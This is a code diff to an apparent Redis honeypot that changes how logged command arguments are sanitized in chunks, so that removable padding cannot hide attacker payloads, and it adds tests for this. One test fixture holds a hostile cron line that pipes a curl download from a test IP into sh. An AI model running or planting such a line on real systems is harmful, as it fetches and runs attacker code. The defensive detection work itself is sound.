@@ -114,15 +114,117 @@ fn text(arg: &[u8]) -> String {
     String::from_utf8_lossy(arg).into_owned()
 }
 
-/// An argument as a sanitized ledger field of at most `max_len`. Only a prefix of the argument
-/// is decoded: invalid UTF-8 grows about threefold in `text` and `sanitize_value` keeps several
-/// full-length copies before it truncates, so running it over a 512 KiB argument cost memory and
-/// CPU out of proportion to the 1 KiB it keeps. Four bytes a kept character is the widest
-/// UTF-8 encoding, so the prefix covers everything a field can keep unless the argument is
-/// mostly characters sanitization removes.
+/// A command or parameter name to match on. No name is anywhere near 64 bytes, so a longer
+/// argument only needs to stay unequal to every name; cutting it avoids decoding and casing an
+/// attacker-sized argument.
+fn name(arg: &[u8]) -> String {
+    text(&arg[..arg.len().min(64)])
+}
+
+/// Raw bytes [`ledger`] sanitizes at a time. Invalid UTF-8 grows about threefold in `text` and
+/// `sanitize_value` keeps several full-length copies, so running it over a 512 KiB argument cost
+/// memory out of proportion to the 1 KiB a field keeps; a chunk bounds that to a few tens of KiB.
+const LEDGER_CHUNK: usize = 4096;
+
+/// An argument as a sanitized ledger field of at most `max_len` bytes AFTER sanitization.
+/// Sanitizing a chunk at a time and stopping once `max_len` sanitized bytes exist keeps the work
+/// bounded without letting padding that sanitization removes (CR/LF/tab runs, NULs, zero-width
+/// characters) push the payload out of the window: a prefix cut before sanitizing recorded an
+/// empty value for a payload behind 4 KiB of such padding. The scan is capped only by the
+/// argument's own length, which the parser already bounds.
+///
+/// Equal to `sanitize_value(text(arg), max_len)` except that NFC composition does not reach across
+/// a chunk boundary; [`chunk_end`] and [`skip_csi_tail`] keep a boundary from changing anything
+/// else that is kept.
 fn ledger(arg: &[u8], max_len: usize) -> String {
-    let prefix = &arg[..arg.len().min(max_len.saturating_mul(4))];
-    sanitize_value(&text(prefix), max_len)
+    let mut out = String::new();
+    let mut start = 0;
+    while start < arg.len() && out.len() < max_len {
+        let (end, csi_open) = chunk_end(arg, start);
+        let mut piece = sanitize_value(&text(&arg[start..end]), usize::MAX);
+        // Sanitization collapses a run of line breaks to one space; a run the boundary cut
+        // leaves a second space at the start of this piece.
+        if start > 0
+            && is_line_break(arg[start - 1])
+            && is_line_break(arg[start])
+            && piece.starts_with(' ')
+        {
+            piece.remove(0);
+        }
+        let room = max_len - out.len();
+        if piece.len() > room {
+            let mut cut = room;
+            while !piece.is_char_boundary(cut) {
+                cut -= 1;
+            }
+            out.push_str(&piece[..cut]);
+            break;
+        }
+        out.push_str(&piece);
+        start = if csi_open {
+            skip_csi_tail(arg, end)
+        } else {
+            end
+        };
+    }
+    out
+}
+
+/// The bytes `sanitize_value` collapses a run of into one space.
+fn is_line_break(b: u8) -> bool {
+    matches!(b, b'\r' | b'\n' | b'\t' | 0x0B | 0x0C)
+}
+
+/// A byte `sanitize_value`'s CSI stripping treats as a parameter: 0x20-0x3F, and the line breaks
+/// that have already become a space by then.
+fn is_csi_param(b: u8) -> bool {
+    (0x20..=0x3F).contains(&b) || is_line_break(b)
+}
+
+/// Where the chunk of `arg` starting at `start` ends: at most [`LEDGER_CHUNK`] on and never
+/// inside a UTF-8 sequence. A chunk would also end inside an unfinished ANSI CSI escape, which
+/// the whole argument strips as one: the end moves back to the escape, or when the escape fills
+/// the chunk, the second value is true and the caller continues past the escape with
+/// [`skip_csi_tail`]. Always past `start`.
+fn chunk_end(arg: &[u8], start: usize) -> (usize, bool) {
+    let mut end = (start + LEDGER_CHUNK).min(arg.len());
+    if end == arg.len() {
+        return (end, false);
+    }
+    for _ in 0..3 {
+        if end > start + 1 && arg[end] & 0xC0 == 0x80 {
+            end -= 1;
+        }
+    }
+    if let Some(i) = arg[start..end].iter().rposition(|&b| b == 0x1B) {
+        let esc = start + i;
+        let open = arg.get(esc + 1) == Some(&b'[')
+            && arg[(esc + 2).min(end)..end]
+                .iter()
+                .all(|&b| is_csi_param(b));
+        if open {
+            if esc > start {
+                return (esc, false);
+            }
+            return (end, true);
+        }
+    }
+    (end, false)
+}
+
+/// The index after the rest of a CSI escape whose parameters ran to `from`: past any more
+/// parameter bytes and then one final byte, as `sanitize_value` consumes it.
+fn skip_csi_tail(arg: &[u8], mut from: usize) -> usize {
+    while let Some(&b) = arg.get(from) {
+        if (0x40..=0x7E).contains(&b) {
+            return from + 1;
+        }
+        if !is_csi_param(b) {
+            break;
+        }
+        from += 1;
+    }
+    from
 }
 
 /// A fresh 40-hex id, as Redis mints for `run_id` / `master_replid` on every boot.
@@ -381,9 +483,7 @@ impl Session {
     pub fn dispatch<A: AsRef<[u8]>>(&mut self, args: &[A]) -> (Vec<u8>, Vec<SensorEvent>) {
         let args: Vec<&[u8]> = args.iter().map(AsRef::as_ref).collect();
         let args = args.as_slice();
-        // No command name is anywhere near this long, so a longer one only needs to stay unequal
-        // to every name; cutting it avoids decoding and uppercasing an attacker-sized argument.
-        let cmd = text(&args[0][..args[0].len().min(64)]).to_ascii_uppercase();
+        let cmd = name(args[0]).to_ascii_uppercase();
         match cmd.as_str() {
             // Real Redis PING echoes its optional message (as a bulk string) and errors on excess
             // arity; a bare PING is +PONG.
@@ -437,7 +537,7 @@ impl Session {
                 vec![],
             );
         };
-        match text(sub).to_ascii_uppercase().as_str() {
+        match name(sub).to_ascii_uppercase().as_str() {
             "GET" => (canned_config_get(), vec![]),
             "SET" => self.handle_config_set(args),
             other => (
@@ -460,7 +560,7 @@ impl Session {
                 vec![],
             );
         }
-        let param_lower = text(args[2]).to_ascii_lowercase();
+        let param_lower = name(args[2]).to_ascii_lowercase();
         let mut events = Vec::new();
         if param_lower == "dir" || param_lower == "dbfilename" {
             let param = ledger(args[2], MAX_METADATA_STRING_LEN);
@@ -1094,6 +1194,83 @@ mod tests {
         let kept = ledger(&binary, MAX_VALUE_LEN);
         assert!(kept.len() <= MAX_VALUE_LEN);
         assert!(!kept.is_empty());
+    }
+
+    /// Padding that sanitization removes ahead of the payload must not hide it: the kept prefix
+    /// is `max_len` bytes after sanitizing, wherever in the argument they come from.
+    #[test]
+    fn a_payload_behind_removable_padding_is_still_recorded() {
+        let payload = "*/1 * * * * curl http://203.0.113.9/x | sh";
+        // Each of these leaves at most one space however long it is.
+        let paddings: [&[u8]; 4] = [
+            b"\r\n\t",
+            b"\x00",
+            "\u{200b}".as_bytes(),
+            b"\x1b[2K\x00\xe2\x80\x8b\xe2\x80\xae",
+        ];
+        for pad in paddings {
+            for reps in [1usize, 1024, 4000, 20_000, 60_000] {
+                let mut arg = pad.repeat(reps);
+                arg.extend_from_slice(payload.as_bytes());
+                let kept = ledger(&arg, MAX_VALUE_LEN);
+                assert!(
+                    kept.contains(payload),
+                    "padding {pad:?} x {reps} hid the payload: {kept:?}"
+                );
+                assert_eq!(kept, sanitize_value(&text(&arg), MAX_VALUE_LEN));
+            }
+        }
+    }
+
+    /// The chunked ledger equals sanitizing the whole argument, over generated arguments that mix
+    /// ASCII, line breaks, controls, zero-width and multi-byte characters, invalid bytes and CSI
+    /// escapes in runs long enough to cross many chunk boundaries.
+    #[test]
+    fn the_chunked_ledger_equals_sanitizing_the_whole_argument() {
+        let atoms: [&[u8]; 12] = [
+            b"abc",
+            b" ",
+            b"\r\n",
+            b"\t",
+            b"\x00",
+            "\u{200b}".as_bytes(),
+            "\u{e9}".as_bytes(),
+            "\u{1f600}".as_bytes(),
+            b"\xff",
+            b"\x1b[31m",
+            b"\x1b[",
+            b"\x1b",
+        ];
+        let mut seed = 0x2545_f491_4f6c_dd1du64;
+        let mut next = move || {
+            seed ^= seed << 13;
+            seed ^= seed >> 7;
+            seed ^= seed << 17;
+            seed
+        };
+        for case in 0..300 {
+            let mut arg = Vec::new();
+            let target = 1 + (next() % 40_000) as usize;
+            while arg.len() < target {
+                let atom = atoms[(next() % atoms.len() as u64) as usize];
+                let run = if next() % 4 == 0 {
+                    1 + next() % 3000
+                } else {
+                    1
+                };
+                for _ in 0..run {
+                    arg.extend_from_slice(atom);
+                }
+            }
+            for max_len in [128, MAX_VALUE_LEN] {
+                assert_eq!(
+                    ledger(&arg, max_len),
+                    sanitize_value(&text(&arg), max_len),
+                    "case {case}, max_len {max_len}, {} bytes",
+                    arg.len()
+                );
+            }
+        }
     }
 
     #[test]
